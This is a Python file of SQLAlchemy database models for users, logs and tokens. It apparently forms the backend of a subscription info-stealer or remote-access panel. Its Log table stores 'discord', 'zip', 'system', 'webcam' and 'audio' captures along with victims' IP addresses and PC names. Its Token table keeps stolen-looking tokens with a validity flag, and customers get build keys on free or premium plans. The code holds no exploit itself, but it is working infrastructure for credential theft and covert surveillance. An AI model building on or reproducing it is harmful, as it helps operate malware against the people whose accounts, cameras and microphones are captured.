from sqlalchemy import Column, Integer, String, Boolean, DateTime, ForeignKey, Enum
from sqlalchemy.orm import relationship
from sqlalchemy.sql import func
from app.core.database import Base
import enum

class PlanType(str, enum.Enum):
    FREE = "free"
    PREMIUM = "premium"

class User(Base):
    __tablename__ = "users"

    id = Column(Integer, primary_key=True, index=True)
    account_id = Column(String, unique=True, index=True) # Added account_id
    username = Column(String, unique=True, index=True)
    password_hash = Column(String)
    build_key = Column(String, unique=True, index=True)
    plan = Column(String, default=PlanType.FREE)  # 'free' or 'premium'
    is_admin = Column(Boolean, default=False)
    is_active = Column(Boolean, default=True)
    created_at = Column(DateTime(timezone=True), server_default=func.now())

    logs = relationship("Log", back_populates="owner")
    tokens = relationship("Token", back_populates="owner")

class Log(Base):
    __tablename__ = "logs"

    id = Column(Integer, primary_key=True, index=True)
    user_id = Column(Integer, ForeignKey("users.id"))
    log_type = Column(String)  # 'discord', 'zip', 'system', 'webcam', 'audio'
    content = Column(String)   # JSON string or text
    ip_address = Column(String)
    pc_name = Column(String)
    created_at = Column(DateTime(timezone=True), server_default=func.now())

    owner = relationship("User", back_populates="logs")

class Token(Base):
    __tablename__ = "tokens"

    id = Column(Integer, primary_key=True, index=True)
    user_id = Column(Integer, ForeignKey("users.id"))
    token = Column(String, unique=True, index=True)
    is_valid = Column(Boolean, default=None)
    token_metadata = Column(String) # JSON string with user info
    created_at = Column(DateTime(timezone=True), server_default=func.now())

    owner = relationship("User", back_populates="tokens")
